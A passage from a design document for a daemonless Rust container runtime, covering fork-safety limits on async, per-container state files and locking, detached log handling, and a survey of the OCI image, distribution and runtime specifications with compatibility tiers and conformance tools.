| `create` | `mkdir` for uniqueness; `flock`; fork/exec the supervisor; read the handshake | socketpair, one handshake, then closed |
| `start` | `flock`; `open(exec.fifo, O_RDONLY\|O_NONBLOCK)`; `poll` fifo + pidfd; set `status=running` | **none** |
| `kill` | `flock`; verify pid against the start-time check or a pidfd; `kill(pid, sig)` | **none** |
| `kill --all` / final `SIGKILL` of `stop` | write `1` to the cgroup's `cgroup.kill` | **none** |
| `state` | read one `state.json` | **none** |
| `ps` | `readdir` + read each `state.json`; no lock | **none** |
| `logs [-f]` | read the log file; `inotify`/`poll` for `-f` | **none** |
| `delete` | `flock`; the shared teardown path | **none** |
| `attach` (phase 2) | connect to the supervisor's per-container socket | the only operation that needs one |

The design's best property is that the two most timing-sensitive operations — the create/start
rendezvous — need **zero protocol**. The kernel's FIFO is the whole mechanism (§5.5).

### 7.4 Where async is disqualified, and why

**Fact.** `fork(2)`: *"The child process is created with a single thread—the one that called
fork()"*, and *"After a fork() in a multithreaded program, the child can safely call only
async-signal-safe functions (see signal-safety(7)) until such time as it calls execve(2)"*,
and *"The entire virtual address space of the parent is replicated in the child, including the
states of mutexes, condition variables, and other pthreads objects."*

**Fact.** Operationally: if another thread holds the allocator's arena lock at the instant of
the `fork`, the child inherits the lock's *memory* in the locked state but not the thread that
would release it. **Any allocation in the child then deadlocks, forever, with no error.** The
same applies to any global `Mutex`, `std::io::Stdout`'s lock, a logging subscriber's internal
lock, a resolver cache, or a `OnceLock` initialization in progress.

**Fact.** `signal-safety(7)`'s allowlist is essentially raw syscalls. Formatting a string,
pushing to a `Vec` and returning an owned error are all outside it. The window between
`clone()` and `execve()` in the container init must be written like signal-handler code — and
that window has a great deal to do: mount roughly eight filesystems, `pivot_root`, set the
hostname, write sysctls, drop capabilities, load a seccomp program, set rlimits, open the exec
FIFO.

**Fact.** `clone(2)` with namespace flags is the same kernel path; glibc's `fork()` is itself
implemented as `clone(SIGCHLD)`. Nothing about using `clone` instead of `fork` relaxes any of
this.

**The boundary, drawn by subsystem:**

| Subsystem | Sync or async | Why |
|---|---|---|
| Container create/start — clone, mounts, `pivot_root`, caps, seccomp, `execve` | **strictly sync, strictly single-threaded, no runtime of any kind** | the fork-safety facts above. Non-negotiable. |
| The supervisor's event loop — signalfd, pidfd, stdio pipes, attach socket | **sync `poll`/`epoll`** | it is three to five fds. A hand-rolled loop has zero fork hazard. The supervisor is the process that calls `clone()`, so a threaded runtime here is a hard no. |
| Registry pull — HTTP, TLS, parallel blob downloads | **async is genuinely right**, or a thread pool | real network I/O parallelism; several layers at once is a wall-clock win. |
| Layer extraction (tar → directories) | **thread pool**, not async | CPU and disk bound; async buys nothing for blocking file I/O. |
| `ps` / `logs` / `state` / `kill` — the CLI read paths | **sync** | reading N small files; async would be slower and more code. |

**Recommendation.** **The process that calls `clone()` never has more than one thread, ever,
and never links a crate that could create one.** Not "a single-threaded runtime", not "we are
careful" — *never had a second thread*, because a thread that has since exited can still have
left a lock held, and no one can audit every transitive dependency for thread spawning.

**Recommendation.** Make it structural rather than disciplinary: **put the pull path in a
separate process invocation, not merely a separate module.** The pull executes CLI-side,
before any supervisor exists; it may use a multi-threaded runtime freely, write layers to
disk, and exit. The supervisor process never links any of it. The alternative — one binary
with an async entry point on `pull` and a plain one on `supervise` — does work, since a
runtime only spawns threads when it is constructed, but it is a discipline invariant that one
careless lazily-initialized runtime breaks silently.

**Recommendation.** The cloned child must not log through any structured logging framework; it
gets a dedicated raw fd (a pipe to the supervisor) and `write(2)`s pre-formatted bytes into
it. runc does this with `_LIBCONTAINER_LOGPIPE`, crun redirects its whole output handler into
the sync socket while in the child, and conmon always creates a stderr pipe before anything
else. Three independent implementations converged on "the child gets a raw fd, not a logger".

**Convention.** The most mature Rust OCI runtime keeps async out of the container-creation
crate entirely: youki's workspace depends on a multi-threaded async runtime, but
`crates/libcontainer/Cargo.toml` does not depend on it at all.

**This is the project's single biggest rewrite-risk decision.** An async entry point on the
whole binary "because we will need it for pulls later" makes the supervisor multithreaded, the
cloned child inherits a poisoned address space, and the resulting bugs are **nondeterministic
deadlocks in the container init path that reproduce once in a thousand runs** — the worst
possible failure signature, blamed on the kernel, the image and the mounts for weeks. Decide
sync-core now and never revisit it. (Which crates implement each side is a separate question
and belongs with the Rust substrate.)

### 7.5 State persistence

**What `mydocker ps` needs is decided by the hard cases, not the happy path.**

| Case | Situation | What `ps` must report |
|---|---|---|
| A | supervisor alive, container running | read the state file and print |
| B | container exited, supervisor alive | the supervisor `wait()`ed — it must **write the status down** before anything else |
| C | supervisor `SIGKILL`ed, container still running | **`running`, unsupervised.** Nobody holds the stdio read ends (the container stalls once the pipe fills) and nobody will ever reap it. A distinct status, not a lie. |
| D | supervisor and container both killed | **`exited`, code `unknown`** — never `0`. Cross-check the cgroup's `cgroup.events` and `memory.events` `oom_kill` to at least say *why*. |
| E | after reboot | every container whose state says `running` is definitely not running |

**Recommendation.** Detect case E with the **boot id**. **Fact.**
`/proc/sys/kernel/random/boot_id` is a per-boot random UUID (`proc(5)`, `random(4)`). Record
it in the state file at every transition; on read, if the stored boot id differs from the
current one and the status was `running`, the container is `exited` with code unknown and
reason "host rebooted". Exact, cheap and unambiguous — better than heuristics over `/proc` or
file mtimes, and better than Podman's `alive`-file-in-tmpfs proxy, which answers "did tmpfs
get wiped" rather than the actual question.

**The minimum honest record**, one `state.json` per container, written atomically, plus a
verbatim copy of the OCI `config.json` and the log file beside it:

```
id, name, created_at, boot_id
status                creating | created | running | exited | unknown
bundle, rootfs, image_ref
init_pid, init_start_ticks      /proc/<pid>/stat field 22 — PID-reuse guard
supervisor_pid                  so `ps` can tell case C from case A
cgroup_path
namespace_paths                 convenience only; valid only while init lives
external_fds[3]                 what 0/1/2 pointed at at create time, for `exec` defaults
started_at, finished_at
exit_code: Option<i32>          None means genuinely unknown, never Some(0)
signal:    Option<i32>
oom_killed: bool
error: String                   last failure reason, human-readable
restart_count                   add the field now even if restart policies come later
```

**Convention.** runc's `state.json` carries `init_process_pid`, `init_process_start`,
`created`, `rootless`, `cgroup_paths`, `namespace_paths`, `external_descriptors`,
`intel_rdt_path`, and a full copy of the resolved config — **and no exit code at all.**
`external_descriptors` exists because the container may replace its own fds, so what 0/1/2
pointed at must be recorded at creation time or it is unrecoverable; it is what `runc exec`
uses to default a new process's stdio. **Observation.** Verified on `host-a`:
`"external_descriptors": ["/dev/null", "pipe:[22485389]", "pipe:[22485390]"]`, and those two
pipe inodes are exactly the shim's fds 11 and 13.

**Convention.** Docker persists what runc does not, in `config.v2.json`'s `State`:
`Running`, `Paused`, `Restarting`, `OOMKilled`, `Dead`, `Pid`, `ExitCode`, `Error`,
`StartedAt`, `FinishedAt`. The `Status` string in `docker inspect` is **computed** from those
booleans. **Those four — `ExitCode`, `FinishedAt`, `OOMKilled`, `Error` — are the entire
difference between a container runtime and a container manager.**

**Convention.** The write is a temp file in the same directory plus `rename(2)`, with no
`fsync` and no lock file. `rename` within a directory is atomic on Linux, so a concurrent
reader sees either the complete old file or the complete new one, never a mix. conmon does the
same through glib's atomic write; CRI-O does the same through its atomic file writer.

**Recommendation — what to `fsync`, and only this: the state file after writing a terminal
status.** For `running`, durability is worthless — a crash that loses the write is a crash
that also means the container is gone, and the boot-id check catches it. For `exited` with an
exit code, the write is the only record of information that can never be recreated. `fsync`
the temp file, `rename`, then `fsync` the directory. Two `fsync`s per container death. Without
it, a power loss between a container's death and the state write loses the exit code.

**Recommendation — ordering on container death**, and the order matters: `waitpid` returns →
read the cgroup's `memory.events` `oom_kill` count → **drain the stdio pipes to EOF and flush
the log** → write `status=exited` with code, signal and `oom_killed`, `fsync`, `rename`,
`fsync` the directory → release host resources → tear down cgroup and mounts → exit. Flushing
*before* declaring exited is what keeps the container's last few KiB of output — the panic
message — from disappearing.

#### Concurrency between two simultaneous invocations

**Convention.** runc has a real TOCTOU here and relies on a layer above it to be safe.
`runc@v1.5.2/libcontainer/factory_linux.go` line 52 does `os.Stat(stateDir)` returning
`ErrExist`, and line 91 does `os.Mkdir(stateDir, 0o711)` — stat-then-mkdir, unchanged in the
current release. More importantly, **runc's only mutex is an in-process `sync.Mutex`; there is
no file lock anywhere**, so two concurrent `runc kill`/`delete`/`start` on the same container
are unsynchronized. runc gets away with it because containerd guarantees one shim per
container and the shim serializes its own operations. **We have deleted that layer, so the
locking is ours.**

**Recommendation**, minimal and sufficient:

1. **Creation uniqueness by `mkdir(2)` alone.** It is atomic and fails `EEXIST`. Do not
   `stat` first. This removes runc's TOCTOU by deleting a line of code.
2. **One `flock(LOCK_EX)` per container**, on a dedicated `<dir>/lock` file — not on
   `state.json`, whose fate is tied to a `rename`. Every mutating operation takes it; it is
   auto-released on process death, which is precisely why a lock file beats a pidfile: a
   crashed `mydocker` cannot wedge a container forever. `LOCK_EX|LOCK_NB` failing with
   `EWOULDBLOCK` is the clean "another invocation is operating on this container" answer.
   Open it `O_CLOEXEC` (7.2).
3. **`ps` takes no lock at all.** Each `state.json` is written atomically, so a reader sees a
   complete file; a `ps` that races a transition shows a stale row, which is acceptable.
4. **The name→id index is a directory of symlinks**, created with `symlink(2)`, which is
   atomic and fails `EEXIST`. No index file, no index lock, no index corruption. A real
   database becomes interesting when `ps` gets slow, which is at thousands of containers.
5. **No global lock, ever.** A global lock means one slow `pull` blocks `ps`.

**Fact.** Container ids become path components, so a malicious id is a path traversal. Validate
against a strict allowlist — `^[A-Za-z0-9][A-Za-z0-9_.+-]{0,127}$`, with `.` and `..` rejected
explicitly — **before** the id ever touches a path, rather than relying on a safe-join helper
as the only defence. runc's own `validateID` allows `[A-Za-z0-9_+.-]`, rejects empty, and
rejects anything whose lexically-cleaned form differs.

**What is lost against a daemon, stated honestly:** no in-memory cache, so `ps` is O(containers)
reads (fine to roughly ten thousand); no cross-container atomicity, which we do not need; and
no event stream without a shared append-only log, which is a genuine gap.

### 7.6 The detached-I/O story

**Recommendation.** The supervisor writes the log file **directly** and later serves attach
itself. The container's stdout and stderr are pipes owned by the supervisor; the supervisor
appends one JSON object per line to `<dir>/log.json`; `logs` is a file read and `logs -f` is a
file read plus `inotify`. No FIFO hop.

**Why there is no FIFO hop.** Docker's extra hop exists so that dockerd can restart and
re-open the stream by path — a pipe would break, a named FIFO can be re-opened. That
requirement exists only because the writer and the reader are two different daemons. With one
supervisor doing both, the hop is pure cost, and its failure mode is the 64 KiB stall in §6.2.

**Recommendation.** The supervisor owns rotation, so it must implement a size cap from day
one. **Observation.** On `host-a`, a single nginx container's json log was 27,498,753
bytes after 11 days with no rotation configured — the well-known unbounded-growth footgun. The
cap is about twenty lines of code and its absence is a disk-full outage.

**Recommendation — the fd rule that is easiest to miss.** The supervisor must hold **both ends**
of each stdio channel, or at least never let the read end be the only reference. If the read
end closes while the container writes, the container gets `EPIPE`/`SIGPIPE` and dies.
**Observation.** The shim's fd table demonstrates this directly: fds 12/14/15/16 include both
a write (`l-wx`) and a read (`lr-x`) handle on the *same* FIFO path, and 17/19/20/21 the same
for stderr. **Convention.** conmon does it too, and states why — *"Open a dummy writer to
prevent getting flood of POLLHUPs when last writer closes"* — and opens the read half
`O_RDONLY|O_NONBLOCK|O_CLOEXEC` **first**, then the write half `O_WRONLY|O_CLOEXEC`, which per
`fifo(7)` is the only ordering that cannot block.

**Fact — the security rule.** **Never give a container a file descriptor that refers to the
invoking terminal.** `runc@v1.5.2/docs/terminals.md`: *"a malicious container could take
advantage of TTY-specific `ioctls` like `TIOCSTI` to fake input into the **host** shell."*
Also, output interleaves indistinguishably, and *"Any input to `stdin` will be
non-deterministically split and given to either the container or the shell (because both are
blocked on a `read(2)` of the same FIFO-style file descriptor)"*, and *"using detached
pass-through will result in the container hanging if the `stdout` or `stderr` is a pipe"*.
`TIOCSTI` keystroke injection into the host shell is a full host compromise. If the caller's
stdout is a tty and the container is detached, redirect to a log file or to a pty we own.
Modern kernels can disable `TIOCSTI` via `dev.tty.legacy_tiocsti`; do not rely on it.

**Recommendation — phasing.** Implement detached with pipes, and detached with a console
socket, first. Foreground byte-copying (a host-side `epoll` loop plus raw-mode save/restore
plus `SIGWINCH`) is phase 2. That means no interactive `-it` until phase 2, which is an honest
gap — and it is *not* acceptable to fake it by handing the container the CLI's real tty.

**Recommendation.** Even foreground `mydocker run` (no `-d`) should fork the detached
supervisor and then **attach** to it, proxying stdio and signals. The container's parent is
always the supervisor. The CLI's death then degrades to "a detached container you are no
longer watching" rather than "a dead container". The generalized argument is runc's own: *"any
bug in the long-running foreground `runc` process (such as a memory leak) or a stray OOM-kill
sweep could result in your container being killed through no fault of the user."* Concretely,
if the CLI is the container's parent: `Ctrl-C` kills or orphans the container; closing the
terminal `SIGHUP`s the CLI which `SIGHUP`s the container; the CLI's memory is charged to
whatever cgroup it is in; a CLI crash loses the stdio and the exit status; and `run` over SSH
dies with the SSH session.

**Recommendation — attach framing, when it arrives.** A 1-byte stream tag over
`SOCK_SEQPACKET`, as conmon does, rather than an 8-byte length-prefixed frame, because
SEQPACKET preserves message boundaries and no length field is needed. The one cost to write
down before someone debugs a truncated line: `SOCK_SEQPACKET` has a maximum datagram size, so
the implementation must chunk.

**Recommendation.** Put runtime sockets under a short path — `/run/mydocker/<12-hex>/` — rather
than beside the state directory. **Fact.** `sockaddr_un.sun_path` is 108 bytes including the
NUL. A socket at `/var/lib/mydocker/containers/<64-hex>/attach.sock` is 105 characters: it
fits today and survives neither a prefix, a test directory, nor a non-default root. The short
path is the cheap structural fix; conmon's `O_PATH`-plus-`/proc/self/fd` bind trick is the
expensive one.

### 7.7 What this architecture must not preclude

**Cheap later, because the design already accommodates it:**

| Addition | The mechanism that makes it cheap |
|---|---|
| `attach` / interactive `-it` | the supervisor already owns the pipes and receives the pty master; add a listening socket to its existing `poll` loop |
| `exec` | `namespace_paths` and `external_fds` are already persisted for exactly this; `setns`, fork, `execve`; the subreaper flag already covers reaping its orphans |
| **A daemon, later** | nothing in the design depends on there being no daemon. A daemon becomes a *client* of the same state directory and the same supervisors — which is precisely what containerd is to its shims. The per-container `flock` is already the mutual-exclusion mechanism it would need. |
| An HTTP/gRPC API | same reason: a new front end over the same state module. Podman's model is the one to copy — `podman system service` adds an API socket and **does not become the container's parent**; it is a protocol adapter, not a supervisor. |
| Restart policies | the supervisor already observes the exit; add a loop. Needs `restart_count` in state, which is why that field is in 7.5's list now. |
| `events` | an append-only `events.jsonl` written by supervisors. conmon's second trick applies: writing each exit record into a **shared flat directory** as well as the per-container file gives a watcher one directory to `inotify` instead of N, and that directory *is* the exit event stream for free. |
| cgroup v1 support | only the cgroup module changes — if the cgroup module is behind one boundary from the start. |

**Expensive if unplanned, so decide now:**

| Addition | The mechanism that makes it expensive |
|---|---|
| **Async anywhere in the create path** | §7.4. A threaded runtime around `clone()` is a correctness disaster whose symptom is a one-in-a-thousand nondeterministic deadlock, and removing it later means re-plumbing everything it touched. **This is the rewrite-risk decision.** |
| **Rootless / user namespaces** | needs a privileged-outside-the-userns process to write `uid_map`/`gid_map`, `newuidmap`/`newgidmap` or `CAP_SETUID`, cgroup delegation or none at all, and a different mount strategy. **Make "who writes the id maps" an explicit, named participant even in the root-only implementation** — a `write_id_maps(child_pid)` function called by the supervisor. Then rootless is filling it in. If clone-and-setup is one monolithic function, rootless is a rewrite. |
| **A transactional state model** | if phase 1 writes state ad hoc from three places, adding transactions means finding all of them. **One module owns every state write from day one; nothing else opens `state.json`.** The cheapest expensive-thing-to-defer on this list. |
| **The OCI runtime CLI surface** (`create`/`start`/`state`/`kill`/`delete` with `--root`, `--bundle`, `--console-socket`, `--pid-file`) | if the internal lifecycle does not map cleanly onto those five operations, exposing them later means inventing a translation layer. **Make the internal API literally those five operations plus `exec`, from day one**; `run`/`ps`/`logs` compose them. Free now, expensive later. |
| **Not being the container's parent** | adding an RPC socket to the supervisor is cheap; **changing who is the container's parent is not.** The supervisor is the parent, permanently. Nothing may assume the CLI can be. |
| **`/proc/self/exe` sealing** | retrofitting means auditing every exec path in the codebase. Sixty lines on line one of `main()` now. |
| **Short socket paths** | `sun_path` is 108 bytes; moving sockets after paths are baked into state files and tooling is a migration. |

### What this decides

**Must be decided before any code is written:**

| Decision | Why it cannot wait |
|---|---|
| **Sync, single-threaded core; the pull path is a separate process invocation** | retrofitting is a rewrite, and the failure mode is nondeterministic deadlock in the container init path |
| **The supervisor is the container init's parent, permanently** | changing who the parent is invalidates the exit-status, stdio and signal design simultaneously |
| **One state module owns every write to `state.json`; no other code opens it** | otherwise transactions and locking become an archaeology exercise |
| **The internal API is exactly the five OCI operations plus `exec`** | anything else needs a translation layer to ever expose a runtime CLI |
| **Seal `/proc/self/exe` into a memfd on line one of `main()`** | retrofitting means auditing every exec path |
| **`create` rollback and `delete` are one code path** | separate implementations diverge, and the divergence is a leak |
| **`exit_code` is `Option<i32>`; `unknown` is a real status** | the type shapes every consumer; adding the distinction later means revisiting all of them |
| **Target runtime-spec 1.3.0; accept any SemVer major 1; never reject on version** | the field is decorative in practice, and a rejection path is a compatibility liability that is awkward to remove |
| **Kernel floor ≥ 5.7 so `clone3` + `CLONE_INTO_CGROUP` are assumed** | the `libc::clone` fallback needs a hand-allocated stack with a guard page — the scariest unsafe code in the project, and not writing it is only defensible if the floor is declared up front |
| **Runtime sockets under a short `/run/mydocker/<12-hex>/` path** | `sun_path` is 108 bytes and the natural path is already at 105 |
| **"Who writes the id maps" is a named participant from the start** | otherwise rootless is a restructure rather than a fill-in |

**Can wait:**

| Decision | Why it is safe to defer |
|---|---|
| Hooks (`createRuntime`, `poststop` first) | OPTIONAL in the spec, and our networking is our own — provided the create path has a named point where each would be invoked |
| `attach`, interactive `-it`, foreground stdio proxying | the supervisor already owns the pipes and the pty master; adding a socket to its `poll` loop is additive |
| `exec` | the state fields it needs are already persisted |
| `events` | additive, once exit records are also written to a shared directory |
| Restart policies | additive, given `restart_count` exists in the state record |
| A daemon or an HTTP API | a new front end over the same state directory and the same per-container lock |
| cgroup v1 | contained behind one module |
| `--keep-failed` (leave a failed container's corpse for inspection) | runc's `--keep` equivalent; useful, not structural |

---

---

## 8. The OCI ecosystem

Three specifications, three disjoint jobs, and one conversion that belongs to none of them.
The conversion — image config to runtime `config.json` — is where every "why did my
`ENTRYPOINT` not run" bug lives, and there is no document to check it against.

**Fact.** The three current releases, resolved to tags on 2026-10-23 and unchanged since:

| Spec | Repository | Tag | Released |
|---|---|---|---|
| Image Format Specification | `opencontainers/image-spec` | `v1.1.1` | 2025-03-03 |
| Distribution Specification | `opencontainers/distribution-spec` | `v1.1.1` | 2025-01-29 |
| Runtime Specification | `opencontainers/runtime-spec` | `v1.3.0` | 2025-11-04 |

### 8.1 What each specification owns

| Spec | Owns | Does **not** own |
|---|---|---|
| **Image** | The content-addressable representation of an image at rest and in transit: descriptors, manifests, indexes, the image config JSON, the layer changeset format (tar + whiteouts), the on-disk `image-layout`, media types, annotations, ChainID | How bytes are fetched; how a rootfs is assembled onto a mount; anything about processes |
| **Distribution** | The HTTP API that moves those blobs and manifests: the seventeen `/v2/` endpoints, pull, push, chunked upload, content discovery, deletion, error codes | **Authentication** (explicitly out of scope); storage layout; how blobs are produced; content negotiation (its own document is a `TODO`) |
| **Runtime** | The *filesystem bundle* (a directory holding `config.json` plus a rootfs), the runtime `config.json` schema, the container lifecycle, the five operations (`create`/`start`/`kill`/`delete`/`state`), the Linux section (namespaces, cgroups, seccomp, mounts) | Where the rootfs came from; images; registries; layers; digests |

**Fact.** Authentication is out of scope for the Distribution Specification. The spec says only
that the `/v2/` endpoint "MAY be used for authentication/authorization purposes"
(`distribution-spec@v1.1.1/spec.md`, *Determining Support*).

**Convention.** The entire bearer-token flow every registry implements — `401` challenge,
`WWW-Authenticate: Bearer realm=…,service=…`, a token request to the realm, `Authorization:
Bearer` on the retry — is the Docker Registry v2 token convention layered on RFC 6750, not an
OCI requirement. It is the most load-bearing convention in this whole domain.

### 8.2 Vocabulary, defined precisely

These words are used loosely everywhere. Each definition below is the specification's.

- **Digest** — `algorithm ":" encoded` (`image-spec@v1.1.1/descriptor.md`). `sha256` is the
  registered required algorithm; `sha512` is registered and optional. A digest is computed over
  the **exact bytes** of the blob, never over a parsed or re-serialised form. *Consequence:*
  hashing the output of a JSON round-trip produces the wrong digest, because no JSON library
  reproduces byte-identical input.
- **Blob** — a byte stream stored and retrieved by its digest. Layers, configs, manifests and
  indexes are all blobs; the format has no other kind of object.
- **Descriptor** — the typed pointer `{mediaType, digest, size}`, all three REQUIRED, plus
  optional `urls`, `annotations`, `data`, `artifactType`, `platform`. `size` being REQUIRED is
  what lets a client bound a download before starting it.
- **Layer** — a *filesystem changeset*, serialised as a tar archive of the changes relative to
  the layers beneath it, including whiteout entries for deletions
  (`image-spec@v1.1.1/layer.md`). Media types `application/vnd.oci.image.layer.v1.tar`,
  `…tar+gzip`, `…tar+zstd`.
- **Manifest** — one platform's image: `schemaVersion` (MUST be `2`), an optional top-level
  `mediaType`, a `config` descriptor, and a `layers` array. Ordering is normative: "The array
  MUST have the base layer at index 0. Subsequent layers MUST then follow in stack order"
  (`manifest.md`).
- **Index** — "a higher-level manifest which points to specific image manifests, potentially
  for one or more platforms" (`image-index.md`). Each entry is a descriptor with an optional
  `platform` object. **Manifest list** is Docker's name for the same document under a different
  media type; the two are structurally identical.
- **Image config** — the JSON blob describing creation metadata plus execution defaults, plus
  `rootfs.diff_ids` and `history` (`config.md`). Its own sha256 digest **is the image ID**.
  `rootfs.type` MUST be `layers`, and an unknown value MUST be an error — one of very few
  MUST-error rules in the image spec.
- **Image** — "an image manifest, an image index (optional), a set of filesystem layers, and a
  configuration" (`image-spec@v1.1.1/spec.md`).
- **rootfs** (image sense) — the result of applying every layer changeset in `diff_ids` order
  onto an empty directory.
- **Bundle** and its **root filesystem** (runtime sense) — `runtime-spec@v1.3.0/bundle.md`
  defines a bundle as a directory containing (1) `config.json`, "This REQUIRED file MUST reside
  in the root of the bundle directory", and (2) "container's root filesystem: the directory
  referenced by `root.path`, **if that property is set** in `config.json`".
- **Runtime `config.json`** — the per-container, mutable file in a bundle. Not a blob, not
  content-addressed, no media type.
- **Registry** — a service implementing the `/v2/` HTTP API over a content-addressed blob store
  and a mutable tag→manifest mapping.
- **Repository** — the `<name>` path inside a registry. The grammar is normative
  (`distribution-spec@v1.1.1/spec.md#L155-L167`):
  `[a-z0-9]+((\.|_|__|-+)[a-z0-9]+)*(\/[a-z0-9]+((\.|_|__|-+)[a-z0-9]+)*)*`.
- **Tag** — ≤128 characters matching `[a-zA-Z0-9_][a-zA-Z0-9._-]{0,127}`. A tag is mutable and
  `latest` has no special meaning to a registry.
- **Reference** — the part after the repository name. The spec is strict: it "MUST be either
  (a) the digest of the manifest or (b) a tag. The `<reference>` MUST NOT be in any other
  format."
- **Runtime** — the component that consumes a bundle and produces a running container. It has
  no knowledge of images, registries, layers or digests.

**Fact.** `root` in the runtime `config.json` is annotated `(object, OPTIONAL)` and the prose
immediately below it says: REQUIRED on Linux and on Windows Server Containers, and **MUST NOT
be set** for Hyper-V Containers (`runtime-spec@v1.3.0/config.md#L27-L33`). The OPTIONAL
annotation is the union across platforms; the Hyper-V case is the only reason it reads that
way.

**Trap.** A bundle is not "`config.json` plus a rootfs directory, always". `bundle.md` marks
only `config.json` REQUIRED and makes the rootfs conditional on `root.path` being set. On
Linux both are effectively mandatory, but a reader who hard-codes "two things must exist" will
mis-read the spec in the other direction later.

### 8.3 The two files called a config

This is the single most common confusion in the area. Both are JSON, both are called a
"config", and they share no fields.

| | **Image config** | **Runtime `config.json`** |
|---|---|---|
| Spec | `image-spec@v1.1.1/config.md` | `runtime-spec@v1.3.0/config.md` |
| Media type | `application/vnd.oci.image.config.v1+json` | none — a plain file in a bundle |
| Identity | its own sha256 digest = **the image ID** | none; mutable, per-container |
| Lives | as a blob in the registry and the local store | at `<bundle>/config.json` |
| Top-level keys | `architecture`, `os`, `variant`, `created`, `author`, `config`, `rootfs`, `history` | `ociVersion`, `root`, `process`, `hostname`, `mounts`, `linux`, `hooks`, `annotations` |
| Process defaults | `config.Env`, `config.Cmd`, `config.Entrypoint`, `config.User`, `config.WorkingDir`, `config.ExposedPorts`, `config.Volumes`, `config.Labels`, `config.StopSignal` | `process.args`, `process.env`, `process.cwd`, `process.user.{uid,gid}`, `process.capabilities`, `process.rlimits` |
| Filesystem | `rootfs.type`, `rootfs.diff_ids[]` | `root.path`, `root.readonly`, `mounts[]` |
| Knows about layers | yes — that is its job | **no** |
| Knows about namespaces/cgroups/seccomp | **no** | yes |

**Fact.** The image config contains a nested object literally named `config`. So
`imageConfig.config.Cmd` is the image's default command while `runtimeConfig.process.args` is
what the runtime will `execve`.

**Recommendation.** Name the Rust types `ImageConfig` and `RuntimeSpec`, never `Config`, and
never derive one from the other with a blanket `From`. The compiler then catches the collision
for free. Tradeoff: `RuntimeSpec` is an odd name for a struct representing a file called
`config.json`; take the oddness.

### 8.4 The conversion nobody specifies

**Fact.** The image spec states that an unpacked image becomes "a runtime bundle" runnable by
"an OCI Runtime", and then stops. Neither spec defines how `config.Env`, `config.Cmd`,
`config.Entrypoint`, `config.User`, `config.WorkingDir`, `config.ExposedPorts`,
`config.Volumes` or `config.StopSignal` map onto `process.args`, `process.env`, `process.cwd`,
`process.user` and `mounts[]`. The gap is deliberate and permanent.

**Fact.** The image config's `Cmd`/`Entrypoint` split has no runtime-spec equivalent;
`process.args` is one flat array.

**Convention.** Docker's rule is `args = Entrypoint ++ Cmd`, where a user-supplied command
replaces `Cmd` only, and `--entrypoint` replaces `Entrypoint` and **clears** `Cmd` (Docker
docs, *Dockerfile reference — how CMD and ENTRYPOINT interact*). Every other tool copies this.
It is convention we must copy to be useful, not a requirement we must meet to be conformant.

**Recommendation.** Make this a named component — call it the *bundler* — and keep it a pure
function `(ImageConfig, RootfsPath, RunOptions) -> RuntimeSpec` with no I/O. Reason: it is the
only part of the image→run path with no external test oracle, so it must be unit-testable
without a kernel. Tradeoff: an extra module boundary around what looks like glue.

### 8.5 Compatibility, in tiers

**Recommendation.** Target compatibility in three tiers, and judge each by a mechanism that can
actually fail, not by a claim.

| | **MVP** | **Intermediate** | **Mature** |
|---|---|---|---|
| **Image spec** | Parse index and manifest in OCI *and* Docker schema-2 media types; parse the image config; apply `tar` and `tar+gzip` layers with whiteouts; verify every digest; detect and reject schema 1 by name; read and write the OCI image layout verbatim | `tar+zstd` decode; normalised platform matching; surface `annotations`; validate written *image* documents against `image-spec@v1.1.1/schema/*.json` in CI | Write manifests and configs (`commit`/`build`); `subject` + referrers, including the mandatory 404 fallback to the referrers tag schema; digest algorithms other than sha256 behind a flag |
| **Distribution spec** | Pull only — `GET`/`HEAD` on `/v2/<name>/manifests/<ref>` and `/v2/<name>/blobs/<digest>`, anonymous bearer auth, follow redirects, `Range` resume | `HEAD` cache validation with the same `Accept` list as the `GET`; `tags/list` with `Link` pagination; stored credentials; `429` + `Retry-After` backoff | Push (`POST`/`PATCH`/`PUT`, chunked, cross-repo `mount=`), `DELETE`, `referrers` |
| **Runtime handoff** | `Env`, `Cmd`, `Entrypoint`, `User`, `WorkingDir` → `process` | `Volumes`, `ExposedPorts`, `StopSignal`, `Labels` | `Healthcheck`, `OnBuild` (Docker-only fields) |
| **Runtime spec** | `opencontainers/runtime-tools` `validation/`: `default`, `create`, `kill`, `killsig`, `kill_no_effect`, `delete`, `delete_only_create_resources` | `hostname`, `linux_devices`, `linux_masked_paths`, the `linux_cgroups_*` group | `hooks`, `hooks_stdin`, `config_updates_without_affect`, the `linux_cgroups_relative_*` group |
| **Storage** | Overlay mount from per-layer diffs; per-container upper/work; ChainID keying | GC; compressed-digest→`diff_id` index; rootless with `userxattr` | A second backend behind the same mount-spec boundary |

**Fact.** Our MVP touches **three of the seventeen** Distribution endpoints: `end-1` (`GET
/v2/`), `end-2` (`GET`/`HEAD` blobs), `end-3` (`GET`/`HEAD` manifests). Everything else —
uploads `end-4a`/`4b`/`5`/`6`/`7`, tag listing `end-8a`/`8b`, deletion `end-9`/`10`,
cross-repository mount `end-11`, referrers `end-12a`/`12b`, upload status `end-13` — is push,
discovery or management. That is the strongest available argument that a pull-only client is
small, bounded work.

### 8.6 What can actually grade us

**Fact.** Four artefacts claim to validate OCI things. Only one grades anything we would build.

| Artefact | Grades | Applies to us? |
|---|---|---|
| `opencontainers/distribution-spec/conformance` @ `v1.1.1` | A **live registry**. A Ginkgo binary driven by `OCI_ROOT_URL`, `OCI_NAMESPACE`, `OCI_USERNAME`, `OCI_PASSWORD`, with four workflow switches; most of it needs write credentials and a writable namespace | **No, at any tier.** It is structurally unable to test a client |
| `opencontainers/image-spec@v1.1.1/schema/*.json` | Documents we *write* (`config-schema`, `image-index-schema`, `image-manifest-schema`, descriptor and defs) | Partly — it grades output, never our parser. There is no layer schema, because a layer is a tar |
| `opencontainers/image-tools` (the `oci-image-tool` validator CLI) | — | **No. Archived; last push 2023-03-09.** There is no maintained OCI reference validator binary for images; a JSON-Schema library is the only supported route |
| `opencontainers/runtime-tools` @ commit `bd3b0bd00f44` (2026-10-17) | A **real runtime binary**: `validation/` holds 59 test directories; `validate/` enforces the prose rules; `specerror/` enumerates the spec's MUST/SHOULD statements as error codes | **Yes — the only external grader that applies to anything we build.** Its last tagged release is v0.9.0 from 2019, which makes it look abandoned; development is current on `master`, so pin the commit |

**Fact.** Schema validation of a runtime `config.json` is a *shape* check, not a correctness
gate. `runtime-spec@v1.3.0/schema/config-schema.json` has top-level `"required":
["ociVersion"]` — that is the entire list. `root` is absent. `process.args` is absent
(`process.required` is `["cwd"]` alone). `process.user` has no `required`. `mounts[]` items
have no `required`.

| Field | `config.md` prose | `config-schema.json` |
|---|---|---|
| `ociVersion` | REQUIRED | required ✓ |
